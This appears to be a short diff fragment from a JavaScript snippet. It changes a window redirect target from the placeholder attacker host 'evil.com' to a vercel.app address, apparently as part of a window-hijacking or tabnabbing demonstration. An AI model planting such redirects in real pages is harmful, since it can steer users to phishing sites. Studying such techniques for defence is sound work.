@@ -6,7 +6,7 @@
       return;
     }
 
-    newWin.location.href = "https://evil.com/";
+    newWin.location.href = "https://vercel-app-sigma-five.vercel.app/";
   } catch (e ) {
   }
 })();
